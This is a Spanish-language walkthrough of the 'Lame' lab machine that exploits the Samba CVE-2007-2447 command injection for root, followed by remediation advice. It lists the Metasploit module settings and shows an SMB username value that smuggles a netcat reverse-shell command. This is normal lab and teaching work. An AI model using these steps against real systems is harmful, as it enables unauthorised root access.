Resumen

Lame es la típica de "primera máquina": un Samba antiguo expuesto a Internet con una vulnerabilidad de ejecución de comandos que, encima, entra directamente como root. Ni escalada ni pivoting, puro clásico de 2007.

Vulnerabilidad

CVE-2007-2447 (Samba usermap_script)

Afecta a Samba 3.0.20 a 3.0.25rc3 cuando está activado username map script. El nombre de usuario que se envía en la autenticación se pasa sin sanear a un shell, así que metiendo metacaracteres en el campo de usuario se ejecutan comandos arbitrarios. Como el servicio corre como root, el código se ejecuta con ese privilegio sin necesidad de credenciales.

Varios servicios antiguos. El 445 delata un Samba 3.0.20, versión con una vulnerabilidad pública muy conocida.

Enumeración

Confirmamos la versión del servicio SMB, que es lo que marca el camino

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p139,445 -sCV lame
Samba smbd 3.0.20-Debian

La versión 3.0.20 es vulnerable a CVE-2007-2447. El FTP (vsftpd 2.3.4) y el distccd son otras vías posibles, pero la de Samba es la más limpia porque da root directo.

Explotación

Usamos el módulo de Metasploit del username map script

msf6 > use exploit/multi/samba/usermap_script msf6 > set RHOSTS lame msf6 > set LHOST tun0 msf6 > run

El exploit inyecta un comando en el campo de usuario de la autenticación SMB. Como smbd corre como root, la shell entra directamente con ese privilegio

┌──(jaime㉿kali)-[~]└─$ id
uid=0(root) gid=0(root)

También se puede hacer a mano con smbclient, poniendo como usuario algo como "/=nohup nc -e /bin/sh ..." para disparar la inyección.

Cómo se arregla

Todo parte de un servicio obsoleto y mal configurado, así que el arreglo va por capas:

  • Actualizar Samba: cualquier versión igual o posterior a 3.0.25 corrige la inyección del username map script. Es la solución de fondo.
  • Desactivar username map script: si no se necesita, esa opción del smb.conf no debería estar activa, ya que es la que permite la ejecución.
  • No exponer SMB a Internet: los puertos 139/445 deben quedar en la red interna o filtrados en el cortafuegos.
  • Menor privilegio: evitar ejecutar servicios de red como root siempre que la plataforma lo permita.

Conclusiones

Un Samba de 2007 expuesto es una invitación: la vulnerabilidad es pública, fiable y da root sin credenciales.

Ante el puerto 445, identificar la versión exacta con nmap -sCV es lo que decide el vector; aquí la versión 3.0.20 canta por sí sola.

Lame recuerda que lo más peligroso no suele ser una técnica sofisticada, sino un servicio viejo sin parchear al alcance de cualquiera.
